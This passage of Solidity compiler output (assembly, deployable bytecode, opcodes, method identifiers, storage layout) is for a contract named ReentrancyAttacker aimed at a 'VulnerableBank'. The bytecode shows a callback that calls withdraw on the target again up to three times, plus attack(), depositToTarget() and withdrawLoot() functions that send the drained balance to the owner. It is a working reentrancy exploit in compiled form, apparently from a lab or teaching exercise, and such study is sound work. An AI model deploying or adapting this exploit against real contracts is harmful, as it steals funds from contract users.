\"#utility.yul\":2649:2658   */\n      0x00\n        /* \"#utility.yul\":2682:2719   */\n      tag_119\n        /* \"#utility.yul\":2713:2718   */\n      dup3\n        /* \"#utility.yul\":2682:2719   */\n      tag_78\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":2669:2719   */\n      swap1\n      pop\n        /* \"#utility.yul\":2577:2725   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2731:2906   */\n    tag_80:\n        /* \"#utility.yul\":2840:2899   */\n      tag_121\n        /* \"#utility.yul\":2893:2898   */\n      dup2\n        /* \"#utility.yul\":2840:2899   */\n      tag_79\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":2835:2838   */\n      dup3\n        /* \"#utility.yul\":2828:2900   */\n      mstore\n        /* \"#utility.yul\":2731:2906   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2912:3178   */\n    tag_46:\n        /* \"#utility.yul\":3027:3031   */\n      0x00\n        /* \"#utility.yul\":3065:3067   */\n      0x20\n        /* \"#utility.yul\":3054:3063   */\n      dup3\n        /* \"#utility.yul\":3050:3068   */\n      add\n        /* \"#utility.yul\":3042:3068   */\n      swap1\n      pop\n        /* \"#utility.yul\":3078:3171   */\n      tag_123\n        /* \"#utility.yul\":3168:3169   */\n      0x00\n        /* \"#utility.yul\":3157:3166   */\n      dup4\n        /* \"#utility.yul\":3153:3170   */\n      add\n        /* \"#utility.yul\":3144:3150   */\n      dup5\n        /* \"#utility.yul\":3078:3171   */\n      tag_80\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":2912:3178   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3184:3353   */\n    tag_81:\n        /* \"#utility.yul\":3268:3279   */\n      0x00\n        /* \"#utility.yul\":3302:3308   */\n      dup3\n        /* \"#utility.yul\":3297:3300   */\n      dup3\n        /* \"#utility.yul\":3290:3309   */\n      mstore\n        /* \"#utility.yul\":3342:3346   */\n      0x20\n        /* \"#utility.yul\":3337:3340   */\n      dup3\n        /* \"#utility.yul\":3333:3347   */\n      add\n        /* \"#utility.yul\":3318:3347   */\n      swap1\n      pop\n        /* \"#utility.yul\":3184:3353   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3359:3518   */\n    tag_82:\n        /* \"#utility.yul\":3499:3510   */\n      0x4e6f74206f776e65720000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3495:3496   */\n      0x00\n        /* \"#utility.yul\":3487:3493   */\n      dup3\n        /* \"#utility.yul\":3483:3497   */\n      add\n        /* \"#utility.yul\":3476:3511   */\n      mstore\n        /* \"#utility.yul\":3359:3518   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3524:3889   */\n    tag_83:\n        /* \"#utility.yul\":3666:3669   */\n      0x00\n        /* \"#utility.yul\":3687:3753   */\n      tag_127\n        /* \"#utility.yul\":3751:3752   */\n      0x09\n        /* \"#utility.yul\":3746:3749   */\n      dup4\n        /* \"#utility.yul\":3687:3753   */\n      tag_81\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":3680:3753   */\n      swap2\n      pop\n        /* \"#utility.yul\":3762:3855   */\n      tag_128\n        /* \"#utility.yul\":3851:3854   */\n      dup3\n        /* \"#utility.yul\":3762:3855   */\n      tag_82\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":3880:3882   */\n      0x20\n        /* \"#utility.yul\":3875:3878   */\n      dup3\n        /* \"#utility.yul\":3871:3883   */\n      add\n        /* \"#utility.yul\":3864:3883   */\n      swap1\n      pop\n        /* \"#utility.yul\":3524:3889   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3895:4314   */\n    tag_63:\n        /* \"#utility.yul\":4061:4065   */\n      0x00\n        /* \"#utility.yul\":4099:4101   */\n      0x20\n        /* \"#utility.yul\":4088:4097   */\n      dup3\n        /* \"#utility.yul\":4084:4102   */\n      add\n        /* \"#utility.yul\":4076:4102   */\n      swap1\n      pop\n        /* \"#utility.yul\":4148:4157   */\n      dup2\n        /* \"#utility.yul\":4142:4146   */\n      dup2\n        /* \"#utility.yul\":4138:4158   */\n      sub\n        /* \"#utility.yul\":4134:4135   */\n      0x00\n        /* \"#utility.yul\":4123:4132   */\n      dup4\n        /* \"#utility.yul\":4119:4136   */\n      add\n        /* \"#utility.yul\":4112:4159   */\n      mstore\n        /* \"#utility.yul\":4176:4307   */\n      tag_130\n        /* \"#utility.yul\":4302:4306   */\n      dup2\n        /* \"#utility.yul\":4176:4307   */\n      tag_83\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":4168:4307   */\n      swap1\n      pop\n        /* \"#utility.yul\":3895:4314   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122057b06001b5d67b471650516b21bedcd8d462e9d0c14b6d75bee62731ea2a30e464736f6c63430008220033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b5060405161091538038061091583398181016040528101906100319190610114565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f5ffd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b6107c98061014c5f395ff3fe608060405260043610610073575f3560e01c80639e5faafc1161004d5780639e5faafc14610211578063b36303fe14610227578063d4b8399214610251578063f2433f901461027b576101af565b80632631a7c6146101b357806364bf5dcb146101dd5780638da5cb5b146101e7576101af565b366101af57670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100c957506003600254105b156101ad577ffe490e4ff15fdf52613fd81ee11eb3c5e4480db700591894a5dec8ecb498bbc76002546040516100ff9190610570565b60405180910390a160025f815480929190610119906105b6565b91905055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161017f919061063f565b5f604051808303815f87803b158015610196575f5ffd5b505af11580156101a8573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156101be575f5ffd5b506101c7610291565b6040516101d49190610570565b60405180910390f35b6101e5610297565b005b3480156101f2575f5ffd5b506101fb610316565b6040516102089190610697565b60405180910390f35b34801561021c575f5ffd5b5061022561033b565b005b348015610232575f5ffd5b5061023b610402565b6040516102489190610570565b60405180910390f35b34801561025c575f5ffd5b50610265610407565b6040516102729190610702565b60405180910390f35b348015610286575f5ffd5b5061028f61042b565b005b60025481565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156102fd575f5ffd5b505af115801561030f573d5f5f3e3d5ffd5b5050505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7fce47de3ada8bbc7bfa5119dcccfa33a2a79fc932531d5ece6a80a32547f0b7a33360405161036a9190610697565b60405180910390a15f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016103d3919061063f565b5f604051808303815f87803b1580156103ea575f5ffd5b505af11580156103fc573d5f5f3e3d5ffd5b50505050565b600381565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146104ba576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104b190610775565b60405180910390fd5b7fda99fc855f3b7429eccee4147a58c05d64c5fa1bb47d52ce2605f36cbeba890c476040516104e99190610570565b60405180910390a160015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610555573d5f5f3e3d5ffd5b50565b5f819050919050565b61056a81610558565b82525050565b5f6020820190506105835f830184610561565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6105c082610558565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036105f2576105f1610589565b5b600182019050919050565b5f819050919050565b5f819050919050565b5f61062961062461061f846105fd565b610606565b610558565b9050919050565b6106398161060f565b82525050565b5f6020820190506106525f830184610630565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61068182610658565b9050919050565b61069181610677565b82525050565b5f6020820190506106aa5f830184610688565b92915050565b5f6106ca6106c56106c084610658565b610606565b610658565b9050919050565b5f6106db826106b0565b9050919050565b5f6106ec826106d1565b9050919050565b6106fc816106e2565b82525050565b5f6020820190506107155f8301846106f3565b92915050565b5f82825260208201905092915050565b7f4e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b5f61075f60098361071b565b915061076a8261072b565b602082019050919050565b5f6020820190508181035f83015261078c81610753565b905091905056fea264697066735822122057b06001b5d67b471650516b21bedcd8d462e9d0c14b6d75bee62731ea2a30e464736f6c63430008220033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x915 CODESIZE SUB DUP1 PUSH2 0x915 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x114 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x13F JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF3 DUP2 PUSH2 0xD9 JUMP JUMPDEST DUP2 EQ PUSH2 0xFD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10E DUP2 PUSH2 0xEA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x129 JUMPI PUSH2 0x128 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x136 DUP5 DUP3 DUP6 ADD PUSH2 0x100 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x7C9 DUP1 PUSH2 0x14C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x73 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC GT PUSH2 0x4D JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x211 JUMPI DUP1 PUSH4 0xB36303FE EQ PUSH2 0x227 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x251 JUMPI DUP1 PUSH4 0xF2433F90 EQ PUSH2 0x27B JUMPI PUSH2 0x1AF JUMP JUMPDEST DUP1 PUSH4 0x2631A7C6 EQ PUSH2 0x1B3 JUMPI DUP1 PUSH4 0x64BF5DCB EQ PUSH2 0x1DD JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1E7 JUMPI PUSH2 0x1AF JUMP JUMPDEST CALLDATASIZE PUSH2 0x1AF JUMPI PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO DUP1 ISZERO PUSH2 0xC9 JUMPI POP PUSH1 0x3 PUSH1 0x2 SLOAD LT JUMPDEST ISZERO PUSH2 0x1AD JUMPI PUSH32 0xFE490E4FF15FDF52613FD81EE11EB3C5E4480DB700591894A5DEC8ECB498BBC7 PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH2 0xFF SWAP2 SWAP1 PUSH2 0x570 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x119 SWAP1 PUSH2 0x5B6 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x17F SWAP2 SWAP1 PUSH2 0x63F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x196 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A8 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1C7 PUSH2 0x291 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D4 SWAP2 SWAP1 PUSH2 0x570 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E5 PUSH2 0x297 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1FB PUSH2 0x316 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x208 SWAP2 SWAP1 PUSH2 0x697 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x21C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x225 PUSH2 0x33B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x232 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x23B PUSH2 0x402 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x248 SWAP2 SWAP1 PUSH2 0x570 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x25C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x265 PUSH2 0x407 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x272 SWAP2 SWAP1 PUSH2 0x702 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x286 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x28F PUSH2 0x42B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2FD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x30F JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH32 0xCE47DE3ADA8BBC7BFA5119DCCCFA33A2A79FC932531D5ECE6A80A32547F0B7A3 CALLER PUSH1 0x40 MLOAD PUSH2 0x36A SWAP2 SWAP1 PUSH2 0x697 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3D3 SWAP2 SWAP1 PUSH2 0x63F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3EA JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3FC JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x3 DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x4BA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4B1 SWAP1 PUSH2 0x775 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0xDA99FC855F3B7429ECCEE4147A58C05D64C5FA1BB47D52CE2605F36CBEBA890C SELFBALANCE PUSH1 0x40 MLOAD PUSH2 0x4E9 SWAP2 SWAP1 PUSH2 0x570 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x555 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x56A DUP2 PUSH2 0x558 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x583 PUSH0 DUP4 ADD DUP5 PUSH2 0x561 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x5C0 DUP3 PUSH2 0x558 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x5F2 JUMPI PUSH2 0x5F1 PUSH2 0x589 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x629 PUSH2 0x624 PUSH2 0x61F DUP5 PUSH2 0x5FD JUMP JUMPDEST PUSH2 0x606 JUMP JUMPDEST PUSH2 0x558 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x639 DUP2 PUSH2 0x60F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x652 PUSH0 DUP4 ADD DUP5 PUSH2 0x630 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x681 DUP3 PUSH2 0x658 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x691 DUP2 PUSH2 0x677 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6AA PUSH0 DUP4 ADD DUP5 PUSH2 0x688 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x6CA PUSH2 0x6C5 PUSH2 0x6C0 DUP5 PUSH2 0x658 JUMP JUMPDEST PUSH2 0x606 JUMP JUMPDEST PUSH2 0x658 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6DB DUP3 PUSH2 0x6B0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6EC DUP3 PUSH2 0x6D1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6FC DUP2 PUSH2 0x6E2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x715 PUSH0 DUP4 ADD DUP5 PUSH2 0x6F3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F74206F776E65720000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x75F PUSH1 0x9 DUP4 PUSH2 0x71B JUMP JUMPDEST SWAP2 POP PUSH2 0x76A DUP3 PUSH2 0x72B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x78C DUP2 PUSH2 0x753 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMPI 0xB0 PUSH1 0x1 0xB5 0xD6 PUSH28 0x471650516B21BEDCD8D462E9D0C14B6D75BEE62731EA2A30E464736F PUSH13 0x63430008220033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "398600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"MAX_ATTACKS()": "347",
						"attack()": "infinite",
						"attackCounter()": "2426",
						"depositToTarget()": "infinite",
						"owner()": "2553",
						"target()": "infinite",
						"withdrawLoot()": "infinite"
					}
				},
				"methodIdentifiers": {
					"MAX_ATTACKS()": "b36303fe",
					"attack()": "9e5faafc",
					"attackCounter()": "2631a7c6",
					"depositToTarget()": "64bf5dcb",
					"owner()": "8da5cb5b",
					"target()": "d4b83992",
					"withdrawLoot()": "f2433f90"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 350,
						"contract": "val57.sol:ReentrancyAttacker",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableBank)347"
					},
					{
						"astId": 352,
						"contract": "val57.sol:ReentrancyAttacker",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 354,
						"contract": "val57.sol:ReentrancyAttacker",
						"label": "attackCounter",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(VulnerableBank)347": {
						"encoding": "inplace",
						"label": "contract VulnerableBank",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}